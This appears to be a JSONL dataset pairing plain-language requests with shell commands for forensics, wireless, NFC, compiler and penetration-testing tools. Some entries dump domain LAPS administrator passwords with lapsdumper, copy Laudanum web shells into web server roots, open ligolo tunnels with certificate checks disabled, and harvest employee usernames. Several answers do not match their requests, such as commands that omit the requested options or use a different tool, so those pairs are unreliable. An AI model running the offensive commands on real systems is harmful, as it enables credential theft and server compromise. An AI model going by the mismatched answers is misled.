{"input": "Analyze the Kismet database file \"indoor_capture.kismet\" and provide the statistics without any additional formatting", "answer": "kismetdb_statistics -i indoor_capture.kismet"}
{"input": "Extract statistics from a Kismet database file named \"long_term_capture.kismet\" and output the results in JSON format", "answer": "kismetdb_statistics -i long_term_capture.kismet -j"}
{"input": "Extract statistics from a Kismet database file named \"conference_capture.kismet\" and output the results in JSON format", "answer": "kismetdb_statistics -i conference_capture.kismet -j"}
{"input": "Strip packet data from the KismetDB log file \"capture.kismet\" and save the output to \"stripped_capture.kismet\" while enabling verbose output", "answer": "kismetdb_strip_packets -i capture.kismet -o stripped_capture.kismet -v"}
{"input": "Strip packet data from \"data.kismet\" and save the result to \"output.kismet\" while displaying verbose output and forcing the operation if the output file exists", "answer": "kismetdb_strip_packets -i data.kismet -o output.kismet -v -f"}
{"input": "Strip packet data from \"network_data.kismet\" and save the output to \"clean_data.kismet\" without forcing the operation or enabling verbose output", "answer": "kismetdb_strip_packets -i network_data.kismet -o clean_data.kismet"}
{"input": "Convert the KismetDB file \"data.kismet\" to a GPX file named \"output.gpx\" and force overwrite if the output file already exists", "answer": "kismetdb_to_gpx -i data.kismet -o output.gpx -f"}
{"input": "Convert the KismetDB file \"network_log.kismet\" to a GPX file named \"map_data.gpx\" and exclude any records within 500 meters of latitude 37.7749 and longitude -122.4194", "answer": "kismetdb_to_gpx -i network_log.kismet -o map_data.gpx -e 37.7749,-122.4194,500"}
{"input": "Convert the KismetDB file \"survey.kismet\" to a GPX file named \"results.gpx\" using basic average location information instead of high-precision calculations", "answer": "kismetdb_to_gpx -i survey.kismet -o results.gpx --basic-location"}
{"input": "Convert the KismetDB file \"log.kismet\" to a GPX file named \"output.gpx\" with verbose output, force overwriting the output file, and exclude records within 1000 meters of latitude 34.0522 and longitude -118.2437", "answer": "kismetdb_to_gpx -i log.kismet -o output.gpx -f -v -e 34.0522,-118.2437,1000"}
{"input": "Convert the KismetDB file \"data.kismet\" to a GPX file named \"map.gpx\" and skip cleaning the input database while using basic average location information", "answer": "kismetdb_to_gpx -i data.kismet -o map.gpx -s --basic-location"}
{"input": "Convert the KismetDB file \"logfile.kismet\" to a GPX file named \"gps_data.gpx\" and exclude records within 200 meters of latitude 40.7128 and longitude -74.0060", "answer": "kismetdb_to_gpx -i logfile.kismet -o gps_data.gpx -e 40.7128,-74.0060,200"}
{"input": "Convert the KismetDB file \"capture_data.kismet\" to a GPX file named \"map_output.gpx\" using basic average location information and skipping database cleaning", "answer": "kismetdb_to_gpx -i capture_data.kismet -o map_output.gpx --basic-location -s"}
{"input": "Convert the KismetDB file \"survey_data.kismet\" to a GPX file named \"results.gpx\" with verbose output, force overwriting the output file, and exclude records within 300 meters of latitude 51.5074 and longitude -0.1278", "answer": "kismetdb_to_gpx -i survey_data.kismet -o results.gpx -f -v -e 51.5074,-0.1278,300"}
{"input": "Convert the KismetDB file \"data.kismet\" to a KML file named \"output.kml\" and force overwrite if the output file already exists", "answer": "kismetdb_to_kml -i data.kismet -o output.kml -f"}
{"input": "Generate a KML file from \"network_data.kismet\" and exclude any records within 500 meters of latitude 34.0522 and longitude -118.2437", "answer": "kismetdb_to_kml -i network_data.kismet -o network_map.kml -e 34.0522,-118.2437,500"}
{"input": "Convert \"survey.kismet\" to a KML file \"survey_map.kml\" using basic location averaging for faster processing", "answer": "kismetdb_to_kml -i survey.kismet -o survey_map.kml --basic-location"}
{"input": "Transform the KismetDB file \"session.kismet\" into a KML file \"session_map.kml\", grouping the data by type into folders", "answer": "kismetdb_to_kml -i session.kismet -o session_map.kml -g"}
{"input": "Create a KML file from \"log.kismet\" named \"log_map.kml\" without cleaning the input database and provide verbose output", "answer": "kismetdb_to_kml -i log.kismet -o log_map.kml -v"}
{"input": "Convert all packets from a KismetDB file named \"capture.kismet\" to a traditional pcap file named \"output.pcap\" without cleaning the database", "answer": "kismetdb_to_pcap -i capture.kismet -o output.pcap"}
{"input": "Convert packets from a KismetDB file \"data.kismet\" to a pcapng file \"output.pcapng\", including only packets from the datasource with UUID \"123e4567-e89b-12d3-a456-426614174000\"", "answer": "kismetdb_to_pcap -i data.kismet -o output.pcapng --datasource 123e4567-e89b-12d3-a456-426614174000"}
{"input": "Convert packets from a KismetDB file \"traffic.kismet\" to a pcapng file \"traffic_output.pcapng\", but exclude GPS information from the output", "answer": "kismetdb_to_pcap -i traffic.kismet -o traffic_output.pcapng --skip-gps"}
{"input": "Split the packets from a KismetDB file \"capture.kismet\" into multiple pcapng files, each containing packets from a single datasource, and name the output files \"split_output\"", "answer": "kismetdb_to_pcap -i capture.kismet -o split_output --split-datasource"}
{"input": "Convert packets from a KismetDB file \"logs.kismet\" to a pcapng file \"output.pcapng\", but exclude GPS track information from the output", "answer": "kismetdb_to_pcap -i logs.kismet -o output.pcapng --skip-gps-track"}
{"input": "Convert the KismetDB file \"data.kismet\" to a Wigle CSV file named \"output.csv\" while forcing the overwrite of the output file if it already exists", "answer": "kismetdb_to_wiglecsv -i data.kismet -o output.csv -f"}
{"input": "Convert the KismetDB file \"capture.kismet\" to a Wigle CSV file named \"results.csv\" while excluding records within 500 meters of latitude 40.7128 and longitude -74.0060", "answer": "kismetdb_to_wiglecsv -i capture.kismet -o results.csv -e 40.7128,-74.0060,500"}
{"input": "Convert the KismetDB file \"log.kismet\" to a Wigle CSV file named \"output.csv\" with verbose output and a cache limit of 500 devices", "answer": "kismetdb_to_wiglecsv -i log.kismet -o output.csv -v -c 500"}
{"input": "Convert the KismetDB file \"data.kismet\" to a Wigle CSV file named \"wigle.csv\" without cleaning the input database", "answer": "kismetdb_to_wiglecsv -i data.kismet -o wigle.csv"}
{"input": "Run kismet_discovery on all interfaces and specify a custom configuration file \"custom_kismet.conf\"", "answer": "kismet -c custom_kismet.conf"}
{"input": "Run kismet_eventbus with input file descriptor 3 and output file descriptor 4", "answer": "kismet_eventbus --in-fd 3 --out-fd 4"}
{"input": "Execute kismet_eventbus using file descriptor 5 for input and file descriptor 6 for output", "answer": "kismet_eventbus --in-fd 5 --out-fd 6"}
{"input": "Start kismet_eventbus with input from file descriptor 7 and output to file descriptor 8", "answer": "kismet_eventbus --in-fd 7 --out-fd 8"}
{"input": "Run the kismet_proxytest tool with input file descriptor 3 and output file descriptor 4", "answer": "kismet_proxytest --in-fd 3 --out-fd 4"}
{"input": "Execute kismet_proxytest with input file descriptor 5 and output file descriptor 6", "answer": "kismet_proxytest --in-fd 5 --out-fd 6"}
{"input": "Start kismet_proxytest with input file descriptor 7 and output file descriptor 8", "answer": "kismet_proxytest --in-fd 7 --out-fd 8"}
{"input": "Launch kismet_proxytest using input file descriptor 9 and output file descriptor 10", "answer": "kismet_proxytest --in-fd 9 --out-fd 10"}
{"input": "Run kismet_proxytest with input file descriptor 11 and output file descriptor 12", "answer": "kismet_proxytest --in-fd 11 --out-fd 12"}
{"input": "Capture data from an RTL433 source and connect to a Kismet server at 10.0.0.10 on port 2501 using SSL and a specific source definition \"rtl433:device=0\"", "answer": "kismet_cap_sdr_rtl433 --connect 10.0.0.10:2501 --ssl --source rtl433:device=0"}
{"input": "Scan all ports on the host 192.168.1.1 using knocker", "answer": "knocker -H 192.168.1.1 -SP 1 -EP 65535"}
{"input": "Scan the host 172.16.0.1 using IPv4 addressing only, starting from port 1 and ending at port 1024", "answer": "nmap -p 1-1024 -4 172.16.0.1"}
{"input": "List all Helm releases in the namespace \"production\" with verbose output enabled", "answer": "helm list --namespace production --debug"}
{"input": "Retrieve LAPS passwords for the domain \"corp.local\" using the username \"ldapuser\" and password \"Secure123\" from the LDAP server \"ldap.corp.local\" and save the output to \"corp_laps.csv\"", "answer": "lapsdumper -u ldapuser -p Secure123 -l ldap.corp.local -d corp.local -o corp_laps.csv"}
{"input": "Dump the LAPS password for a specific computer named \"WS01\" in the domain \"testdomain.com\" using the username \"testuser\" and password \"TestP@ss\"", "answer": "lapsdumper -u testuser -p TestP@ss -d testdomain.com -c WS01"}
{"input": "Dump LAPS passwords for the domain \"example.net\" using the username \"user1\" and password \"Passw0rd!\" and save the output to a file named \"example_laps.csv\" while targeting the LDAP server \"ldap.example.net\"", "answer": "lapsdumper -u user1 -p Passw0rd! -l ldap.example.net -d example.net -o example_laps.csv"}
{"input": "Retrieve LAPS passwords for the domain \"example.com\" using the username \"ldapuser\" and password \"Secret123\" and save the output to a file named \"laps_results.csv\" while targeting the LDAP server \"ldap.example.com\"", "answer": "lapsdumper -u ldapuser -p Secret123 -l ldap.example.com -d example.com -o laps_results.csv"}
{"input": "Copy all PHP-based injectable files from Laudanum to the `/var/www/html` directory", "answer": "cp -r /usr/share/laudanum/php/* /var/www/html/"}
{"input": "List all available Wordpress-specific injectable files in the Laudanum directory", "answer": "ls /usr/share/laudanum/wordpress"}
{"input": "Check the contents of the `helpers` directory in Laudanum to see available helper scripts", "answer": "ls /usr/share/laudanum/helpers"}
{"input": "Copy all ColdFusion (CFM) injectable files from Laudanum to the `/var/www/coldfusion` directory", "answer": "cp -r /usr/share/laudanum/cfm/* /var/www/coldfusion/"}
{"input": "Copy all helper scripts from the Laudanum `helpers` directory to the `/tmp` directory for temporary use", "answer": "cp -r /usr/share/laudanum/helpers/* /tmp/"}
{"input": "Perform a DNS lookup for the domain example.com with a query type of MX using lbd", "answer": "dig MX example.com"}
{"input": "Create an EWF image from a file `data.img` with a description \"Forensic Image 2023\", notes \"Critical evidence\", and a segment size of 2 GiB. Use the EnCase 7 format and enable verbose output", "answer": "ewfacquire -D \"Forensic Image 2023\" -N \"Critical evidence\" -S 2G -f encase7 -v data.img"}
{"input": "Acquire data from a file `evidence.img` and save it in the SMART format with a secondary target file `backup`. Use a compression method of \"deflate\" with no compression level", "answer": "ewfacquire -f smart -2 backup -c deflate:none evidence.img"}
{"input": "Acquire data from a device `/dev/sdd` with a segment file size of 500 MiB, a media type of \"fixed\", and a media flag of \"physical\". Log errors to `error_log.txt`", "answer": "ewfacquire -S 500M -m fixed -M physical -l error_log.txt /dev/sdd"}
{"input": "Analyze the EWF file \"image.E01\" with verbose output to get detailed debugging information", "answer": "ewfdebug -v image.E01"}
{"input": "Export all data from the EWF file \"image.E01\" to a raw format, ensuring the output is saved as \"output.raw\" and logging any errors to \"export_log.txt\"", "answer": "ewfexport -f raw -t output.raw -l export_log.txt image.E01"}
{"input": "Export all data from the EWF file \"backup.E01\" to a raw format, using a process buffer size of 4096 bytes, and save the output as \"backup_output.raw\"", "answer": "ewfexport -f raw -p 4096 -t backup_output.raw backup.E01"}
{"input": "Export all data from the EWF file \"data.E01\" to a raw format, using a segment file size of 2 GiB, and save the output as \"data_output.raw\"", "answer": "ewfexport -f raw -S 2GiB -t data_output.raw data.E01"}
{"input": "Export all data from the EWF file \"evidence.E01\" to a raw format, using unattended mode to disable user interaction, and save the output as \"unattended_output.raw\"", "answer": "ewfexport -f raw -u -t unattended_output.raw evidence.E01"}
{"input": "Export all data from the EWF file \"image.E01\" to a raw format, using a compression level of \"best\" for deflate compression, and save the output as \"compressed_output.raw\"", "answer": "ewfexport -f raw -t compressed_output.raw image.E01"}
{"input": "Export all data from the EWF file \"evidence.E01\" to a raw format, using a codepage of \"windows-1252\" for the header section, and save the output as \"codepage_output.raw\"", "answer": "ewfexport -f raw -A windows-1252 -t codepage_output.raw evidence.E01"}
{"input": "Export all data from the EWF file \"disk.E01\" to a raw format, reading 128 sectors at once per chunk, and save the output as \"sector_output.raw\"", "answer": "ewfexport -f raw -b 128 -t sector_output.raw disk.E01"}
{"input": "Display all metadata from the EWF file \"archive.E01\" using the Windows-1252 codepage for header section interpretation", "answer": "ewfinfo -A windows-1252 archive.E01"}
{"input": "Display all metadata from the EWF file \"evidence.E01\" using the Windows-1251 codepage for header section interpretation and dates in ISO 8601 format", "answer": "ewfinfo -A windows-1251 -d iso8601 evidence.E01"}
{"input": "Mount an EWF image file named \"evidence.E01\" to the mount point \"/mnt/ewf\" and pass extended options to the subsystem for additional configuration", "answer": "ewfmount evidence.E01 /mnt/ewf"}
{"input": "Mount an EWF image file named \"disk_image.E01\" to the mount point \"/mnt/forensics\" and display the help menu for additional options", "answer": "ewfmount /data/disk_image.E01 /mnt/forensics && ewfmount -h"}
{"input": "Mount an EWF image file named \"disk_image.E01\" to the mount point \"/mnt/forensics\" and pass multiple extended options to the subsystem for advanced configuration", "answer": "ewfmount disk_image.E01 /mnt/forensics"}
{"input": "Recover data from a corrupt EWF file named \"backup.E01\" with minimal status output and save the result to \"restored_data.raw\"", "answer": "ewfrecover -t restored_data.raw -q backup.E01"}
{"input": "Recover data from a corrupt EWF file named \"data.E01\" with a Windows-1252 codepage for the header section and save the output to \"data_recovered.raw\"", "answer": "ewfrecover -t data_recovered.raw -A windows-1252 data.E01"}
{"input": "Recover data from a corrupt EWF file named \"image.E01\" and print the version of ewfrecover being used", "answer": "ewfrecover image.E01 && ewfrecover -V"}
{"input": "Recover data from a corrupt EWF file named \"disk.E01\" with verbose output, log errors to \"disk_log.txt\", and save the output to \"disk_recovered.raw\"", "answer": "ewfrecover -t disk_recovered.raw -l disk_log.txt -v disk.E01"}
{"input": "Perform a quiet verification of the EWF file `backup.E01` and calculate both MD5 and SHA1 digests", "answer": "ewfverify -q -d md5 -d sha1 backup.E01"}
{"input": "Write an NDEF message from standard input to a MIFARE Classic card, skipping any confirmation prompts", "answer": "mifare-classic-write-ndef -y -i -"}
{"input": "Write an NDEF message stored in \"payload.bin\" to a MIFARE Classic card without any user interaction", "answer": "mifare-classic-write-ndef -y -i payload.bin"}
{"input": "Write an NDEF message from the file \"message.txt\" to a Mifare DESFire card without asking for confirmation", "answer": "mifare-desfire-write-ndef -y -i message.txt"}
{"input": "Write an NDEF message from standard input to a Mifare DESFire card without asking for confirmation", "answer": "mifare-desfire-write-ndef -y -i -"}
{"input": "Show all metadata from the file \"video.mp4\" without excluding any tags", "answer": "exiftool -a video.mp4"}
{"input": "Display all metadata information from the file \"photo.png\", ensuring no tags are excluded", "answer": "exiftool -a photo.png"}
{"input": "Extract all metadata from the file \"archive.zip\", including duplicate tags", "answer": "exiftool -a archive.zip"}
{"input": "Show all metadata from the file \"presentation.pptx\" without omitting any tags", "answer": "exiftool -a presentation.pptx"}
{"input": "Display all metadata information from the file \"logo.svg\", ensuring no tags are excluded", "answer": "exiftool -a logo.svg"}
{"input": "Extract all metadata from the file \"database.db\", including duplicate tags", "answer": "exiftool -a database.db"}
{"input": "List all NFC targets with verbose output to get detailed information about each target", "answer": "nfc-list -v"}
{"input": "Send data to a nearby NFC device using the nfc-dep-initiator tool with all default settings", "answer": "nfc-dep-initiator"}
{"input": "Emulate an NFC Forum Tag Type 2 with a custom NDEF message stored in a file named `ndef_message.txt`", "answer": "nfc-emulate-forum-tag2 -f ndef_message.txt"}
{"input": "Emulate a Mifare Mini tag using `nfc-emulate-tag` and save the emulation output to a file while displaying it in the terminal simultaneously", "answer": "nfc-emulate-tag mifare-mini | tee emulation_output.txt"}
{"input": "Emulate a Mifare Mini tag using `nfc-emulate-tag` and specify a custom configuration file for the emulation settings", "answer": "nfc-emulate-tag -c custom_config.cfg"}
{"input": "Detect and display detailed information about the first NFC target found", "answer": "nfc-poll -v"}
{"input": "Test the connection with the SAM in virtual card mode using the pn53x-sam tool", "answer": "pn53x-sam -m virtual_card"}
{"input": "Test the connection with the SAM in dual mode using the pn53x-sam tool", "answer": "pn53x-sam -m dual"}
{"input": "Use pn53x-tamashell to send a TAMA command `0xD4 0x60` and capture the output for analysis", "answer": "echo -e '\\xD4\\x60' | pn53x-tamashell > output.txt"}
{"input": "Extract email messages from the Outlook PST file \"emails.pst\" using the font file \"arial.ttf\" and save the output to the directory \"output_dir\"", "answer": "readpst -o output_dir emails.pst"}
{"input": "Extract email messages from the PST file \"archive.pst\" using the font file \"courier.ttf\", set the Bates sequence number to 5000, and save the DII load file as \"archive_output.dii\"", "answer": "pst2dii -f courier.ttf -b 5000 -O archive_output.dii archive.pst"}
{"input": "Convert a PST file named \"emails.pst\" to the MH format, including deleted items, and output the results to a directory called \"output_folder\"", "answer": "readpst -D -M -o output_folder emails.pst"}
{"input": "Extract all emails, attachments, and contacts from a PST file named \"archive.pst\" and save them in separate files within the \"extracted_data\" directory", "answer": "readpst -t eac -o extracted_data archive.pst"}
{"input": "Convert a PST file named \"journal.pst\" to a recursive format, including journal entries, and save the results in the \"journal_output\" directory", "answer": "readpst -r -t j -o journal_output journal.pst"}
{"input": "Convert a PST file named \"emails.pst\" to the MH format, output the email bodies in UTF-8 encoding, and save the results in the \"utf8_output\" directory", "answer": "readpst -M -8 -o utf8_output emails.pst"}
{"input": "Show the help menu for the `disassemble` command in baksmali to understand its usage", "answer": "baksmali disassemble --help"}
{"input": "Disassemble the `app.dex` file and save the output to a specific directory for further analysis", "answer": "baksmali disassemble app.dex -o output_directory"}
{"input": "Assemble the smali files in the `custom_smali` directory into a dex file and save it as `custom_app.dex`, while also enabling verbose output", "answer": "smali assemble custom_smali -o custom_app.dex -v"}
{"input": "Connect to a proxy server at `192.168.1.100:8080` using ligolo-agent, and ignore TLS certificate validation for debugging purposes", "answer": "ligolo-agent -connect 192.168.1.100:8080 -ignore-cert"}
{"input": "Use ligolo-agent to connect to a proxy server at `192.168.1.200:8080` with a custom User-Agent string and enable auto-retry on errors", "answer": "ligolo-agent -connect 192.168.1.200:8080 -ua \"CustomAgent/1.0\" -retry"}
{"input": "Bind ligolo-agent to `127.0.0.1:9999`, enable verbose mode, and accept only certificates with the SHA256 fingerprint `efgh5678...`", "answer": "ligolo-agent -bind 127.0.0.1:9999 -v -accept-fingerprint efgh5678..."}
{"input": "Connect to a proxy server at `10.10.10.10:8080` using ligolo-agent, ignore TLS certificate validation, and use a custom User-Agent string", "answer": "ligolo-agent -connect 10.10.10.10:8080 -ignore-cert -ua \"MyCustomAgent/2.0\""}
{"input": "Bind ligolo-agent to `192.168.3.50:5555` and enable verbose mode for detailed logging", "answer": "ligolo-agent -bind 192.168.3.50:5555 -v"}
{"input": "Start the ligolo-proxy server with verbose mode enabled, using a custom TLS certificate and key located at `/etc/certs/cert.pem` and `/etc/certs/key.pem`", "answer": "ligolo-proxy -v -certfile /etc/certs/cert.pem -keyfile /etc/certs/key.pem"}
{"input": "Start the ligolo-proxy server with verbose mode enabled, using autocert to automatically request Let's Encrypt certificates", "answer": "ligolo-proxy -v -autocert"}
{"input": "Generate usernames for \"TechCorp\" using a proxy server at \"https://localhost:8080\"", "answer": "linkedin2username -c TechCorp -x https://localhost:8080"}
{"input": "Generate usernames for \"TechCorp\" with a search depth of 5 loops, a 10-second delay, and save the output to \"techcorp-results\"", "answer": "linkedin2username -c TechCorp -d 5 -s 10 -o techcorp-results"}
{"input": "Generate usernames for \"TechCorp\" with a search depth of 2 loops, a 3-second delay, and append the domain \"techcorp.org\"", "answer": "linkedin2username -c TechCorp -d 2 -s 3 -a techcorp.org"}
{"input": "Check for all possible exploits on a system with kernel version 4.15.0-112-generic and include exploits that are marked as 'highly probable'.\"", "answer": "linux-exploit-suggester -k 4.15.0-112-generic"}
{"input": "Check for all possible exploits on a system with kernel version 5.0.0-37-generic and include exploits that are applicable to the ARM architecture.\"", "answer": "linux-exploit-suggester -k 5.0.0-37-generic"}
{"input": "Run linux-exploit-suggester to check for all possible exploits on the current system and include exploits that are applicable to the x86 architecture.\"", "answer": "linux-exploit-suggester"}
{"input": "Symbolize the ASan log file \"asan.log\" while demangling function names and using a cross-compile prefix for ARM Linux", "answer": "asan_symbolize -d -c \"$HOME/opt/cross/bin/arm-linux-gnueabi-\" < asan.log"}
{"input": "Compile a C++ source file named `main.cpp` with all warnings enabled and treat warnings as errors", "answer": "clang++ -Wall -Werror main.cpp -o main"}
{"input": "Compile a C++ source file named `app.cpp` with debug information and optimization level 2", "answer": "clang++ -g -O2 app.cpp -o app"}
{"input": "Compile a C source file named `program.c` with AddressSanitizer enabled for detecting memory errors", "answer": "clang -fsanitize=address program.c -o program"}
{"input": "Compile a C source file named `example.c` with stack protection enabled", "answer": "clang -fstack-protector example.c -o example"}
{"input": "Compile a C++ source file named `app.cpp` with Link-Time Optimization (LTO) enabled", "answer": "clang++ -flto app.cpp -o app"}
{"input": "Compile a C source file named `test.c` with all warnings enabled and save the output to `test`", "answer": "clang -Wall test.c -o test"}
{"input": "Compile a C++ source file named `main.cpp` with C++17 standard and save the output to `main`", "answer": "clang++ -std=c++17 main.cpp -o main"}
{"input": "Compile a C source file named `program.c` with ThreadSanitizer enabled for detecting data races", "answer": "clang -fsanitize=thread program.c -o program"}
{"input": "Compile a C++ source file named `app.cpp` with UndefinedBehaviorSanitizer enabled", "answer": "clang++ -fsanitize=undefined app.cpp -o app"}
{"input": "Compile a C source file named `example.c` with debug information and save the output to `example`", "answer": "clang -g example.c -o example"}
{"input": "Compile a C++ source file named `main.cpp` with OpenMP support enabled", "answer": "clang++ -fopenmp main.cpp -o main"}
{"input": "Compile a C source file named `test.c` with AddressSanitizer and UndefinedBehaviorSanitizer enabled", "answer": "clang -fsanitize=address,undefined test.c -o test"}
{"input": "Compile a C++ source file named `app.cpp` with RTTI (Run-Time Type Information) disabled", "answer": "clang++ -fno-rtti app.cpp -o app"}
{"input": "Compile a C source file named `program.c` with stack protection and optimization level 3 enabled", "answer": "clang -fstack-protector -O3 program.c -o program"}
{"input": "Compile a C++ source file named `main.cpp` with C++20 standard and save the output to `main`", "answer": "clang++ -std=c++20 main.cpp -o main"}
{"input": "Compile a C source file named `example.c` with AddressSanitizer and save the output to `example`", "answer": "clang -fsanitize=address example.c -o example"}
{"input": "Compile a C++ source file named `app.cpp` with debug information and optimization level 1 enabled", "answer": "clang++ -g -O1 app.cpp -o app"}
{"input": "Compile a C++ source file named `example.cpp` with debugging information and optimization level 2", "answer": "clang++ -g -O2 example.cpp -o example"}
{"input": "Compile a C++ source file named `app.cpp` with OpenMP support and link against the OpenMP runtime library", "answer": "clang++ -fopenmp app.cpp -o app"}
{"input": "Compile a C++ source file named `program.cpp` with AddressSanitizer enabled for detecting memory errors", "answer": "clang++ -fsanitize=address program.cpp -o program"}
{"input": "Compile a C++ source file named `code.cpp` with ThreadSanitizer enabled for detecting data races", "answer": "clang++ -fsanitize=thread code.cpp -o code"}
{"input": "Compile a C++ source file named `source.cpp` with UndefinedBehaviorSanitizer enabled for detecting undefined behavior", "answer": "clang++ -fsanitize=undefined source.cpp -o source"}
{"input": "Compile a C++ source file named `main.cpp` with Link-Time Optimization (LTO) enabled", "answer": "clang++ -flto main.cpp -o main"}
{"input": "Compile a C++ source file named `example.cpp` with coverage instrumentation for code coverage analysis", "answer": "clang++ -fprofile-instr-generate -fcoverage-mapping example.cpp -o example"}
{"input": "Compile a C++ source file named `test.cpp` with the `-Wextra` flag to enable extra warnings", "answer": "clang++ -Wextra test.cpp -o test"}
{"input": "Format the file `example.cpp` in-place using the LLVM style", "answer": "clang-format -i --style=LLVM example.cpp"}
{"input": "Check how the file `main.js` would be formatted using the Google style without making any changes", "answer": "clang-format --dry-run --style=Google main.js"}
{"input": "Format the file `data.json` using the fallback style Mozilla and save the changes in-place", "answer": "clang-format -i --fallback-style=Mozilla data.json"}
{"input": "Format the file `example.java` and sort its includes using the WebKit style", "answer": "clang-format --sort-includes --style=WebKit example.java"}
{"input": "Format the file `script.js` and assume its filename is `app.js` for language detection", "answer": "clang-format --assume-filename=app.js script.js"}
{"input": "Format the file `main.c` using a custom style configuration with an indent width of 8", "answer": "clang-format --style=\"{BasedOnStyle: llvm, IndentWidth: 8}\" main.c"}
{"input": "Format the file `main.cpp` and show the list of processed files", "answer": "clang-format --verbose main.cpp"}
{"input": "Format the file `example.c` and fail if the formatting is incomplete", "answer": "clang-format --fail-on-incomplete-format example.c"}
{"input": "Apply clang-format to all changed lines in a Git diff, using the LLVM style, and directly modify the files", "answer": "git diff -U0 --no-color --relative HEAD^ | clang-format-diff -p1 -i -style=LLVM"}
{"input": "Format all changed lines in a Git diff, using the LLVM style, and fallback to the Google style if the `.clang-format` file is missing", "answer": "git diff -U0 --no-color --relative HEAD^ | clang-format-diff -p1 -style=LLVM -fallback-style=Google"}
{"input": "Format only the staged changes in the working directory using clang-format", "answer": "git clang-format --staged"}
{"input": "Apply fixes to \"file.cpp\" even if there are compilation errors, and output the fixes to a YAML file named \"fixes.yaml\"", "answer": "clang-tidy --fix-errors --export-fixes=fixes.yaml file.cpp"}
{"input": "Index the file `example.c` and check the results against the prefix `CHECK` using `c-index-test`", "answer": "c-index-test -index-file -check-prefix=CHECK example.c"}
{"input": "Test the code completion timing at line 10, column 5 in the file `example.c` using `c-index-test`", "answer": "c-index-test -code-completion-timing=example.c:10:5 example.c"}
{"input": "Test the inclusion stack for the translation unit (TU) stored in `example.ast` using `c-index-test`", "answer": "c-index-test -test-inclusion-stack-tu example.ast"}
{"input": "Apply all replacements in the directory `/home/user/replacements` and format the code using the LLVM style", "answer": "clang-apply-replacements --format --style=LLVM /home/user/replacements"}
{"input": "Apply all replacements in the directory `/home/user/replacements` and use a specific formatting style with an IndentWidth of 8 based on the LLVM style", "answer": "clang-apply-replacements --format --style=\"{BasedOnStyle: llvm, IndentWidth: 8}\" /home/user/replacements"}
{"input": "Apply all replacements in the directory `/home/user/replacements` without formatting the code", "answer": "clang-apply-replacements /home/user/replacements"}
{"input": "Apply all replacements in the directory `/tmp/replacements`, ignore insert conflicts, and use the Chromium coding style for formatting", "answer": "clang-apply-replacements --format --style=Chromium --ignore-insert-conflict /tmp/replacements"}
{"input": "Apply all replacements in the directory `/home/user/replacements` and use the Mozilla coding style for formatting", "answer": "clang-apply-replacements --format --style=Mozilla /home/user/replacements"}
{"input": "Apply all replacements in the directory `/var/replacements`, remove change description files after successful merging, and use the WebKit coding style for formatting", "answer": "clang-apply-replacements --format --style=WebKit --remove-change-desc-files /var/replacements"}
{"input": "Pretty-print the AST for the source file `example.cpp` and append the compiler argument `-Wall` to the command line", "answer": "clang-check --ast-print --extra-arg=-Wall example.cpp"}
{"input": "Run clang-check on all `.cpp` files in the `src/` directory using the build path `build/`", "answer": "find src/ -name '*.cpp' | xargs clang-check -p build/"}
{"input": "Analyze a source file `main.cpp` with clang-query, preloading commands from a file named `commands.txt` and enabling colored output", "answer": "clang-query --preload=commands.txt --use-color main.cpp"}
{"input": "Execute clang-query on a source file `module.c` with a preloaded command file `init.txt` and prepend the compiler argument `-Iinclude/`", "answer": "clang-query --preload=init.txt --extra-arg-before=-Iinclude/ module.c"}
{"input": "Use clang-query to analyze a source file `example.cpp` and read commands from a file `queries.txt`", "answer": "clang-query -f queries.txt example.cpp"}
{"input": "Run clang-query on a source file `program.c` with an additional compiler argument `-Wall` and a build path `cmake-build/`", "answer": "clang-query -p cmake-build/ --extra-arg=-Wall program.c"}
{"input": "Print all covered functions from the binary file `example_binary` and the corresponding `.sancov` file `example.sancov`", "answer": "sancov -covered-functions example_binary example.sancov"}
{"input": "Strip the path prefix `/usr/local/src/` from file paths in the coverage report generated from `example_binary` and `example.sancov`", "answer": "sancov -symbolize -strip_path_prefix=/usr/local/src/ example_binary example.sancov"}
{"input": "Run scan-build on a project, enabling verbose output, and analyze functions in included header files", "answer": "scan-build -v -analyze-headers make"}
{"input": "Analyze a project with scan-build, outputting the results in SARIF format for integration with other tools", "answer": "scan-build -sarif make"}
{"input": "Analyze a project with scan-build, specifying a custom title for the generated HTML report", "answer": "scan-build --html-title=\"My Project Analysis\" make"}
{"input": "Analyze a project with scan-build, using a specific compiler located at `/usr/bin/clang-12`", "answer": "scan-build --use-cc=/usr/bin/clang-12 make"}
{"input": "Use scan-build to analyze a project, specifying a custom analyzer target for cross-compilation", "answer": "scan-build --analyzer-target=arm-linux-gnueabi make"}
{"input": "Run a static analysis on my C++ project located in `/home/user/project` using `scan-build-py`, and save the results in the `/home/user/results` directory. Enable verbose output and analyze header files as well", "answer": "scan-build-py --verbose --analyze-headers --output /home/user/results make -C /home/user/project"}
{"input": "Run `scan-build-py` on a project, but first intercept the build commands before running the static analyzer. Enable statistics generation and keep the output directory even if no issues are found", "answer": "scan-build-py --intercept-first --stats --keep-empty make -C /home/user/project"}
{"input": "Run `scan-build-py` on a project, but limit the number of times a block can be visited during analysis to 50. Also, use the `region` store model for more precise analysis", "answer": "scan-build-py --maxloop 50 --store region make -C /home/user/project"}
{"input": "Start the scan-view tool to analyze the results in the directory `/var/scan-results` and allow connections from any host", "answer": "scan-view --allow-all-hosts /var/scan-results"}
{"input": "Start scan-view for the results in `/home/user/scan-output` on the default host and port, with auto-reloading enabled", "answer": "scan-view --auto-reload /home/user/scan-output"}
{"input": "Set the log verbosity of clangd to \"verbose\" for low-level details", "answer": "clangd --log=verbose"}
{"input": "Compile a Fortran source file named `program.f90` with OpenMP support and enable debugging information for OpenMP offloading", "answer": "gfortran -fopenmp -g program.f90"}
{"input": "Compile a Fortran source file named `parallel.f90` and enable thread-parallel code generation using ISL (Integer Set Library)", "answer": "gfortran -fopenmp parallel.f90 -o parallel"}
{"input": "Parse the source file \"example.f90\" in free form, measure the parsing time, and dump the parse tree without generating any code", "answer": "f18-parse-demo -Mfree -ftime-parse -fdump-parse-tree example.f90"}
{"input": "Optimize the FIR code in the file `example.fir` using the `fir-opt` tool with all available dialects enabled", "answer": "fir-opt --dialects=acc,affine,arith,builtin,cf,complex,cuf,dlti,fir,fircg,func,hlfir,llvm,math,omp,scf,vector example.fir"}
{"input": "Optimize the FIR code in `code.fir` by enabling the `arith` dialect and setting the debugify function limit to 10", "answer": "fir-opt --dialects=arith --debugify-func-limit=10 code.fir"}
{"input": "Preprocess the Fortran source file `input.f90` and save the preprocessed output to `output.i`", "answer": "flang-new -E -o output.i input.f90"}
{"input": "Compile the Fortran source file `program.f90` with OpenMP support and save the output to `program.o`", "answer": "flang-new -fopenmp -o program.o program.f90"}
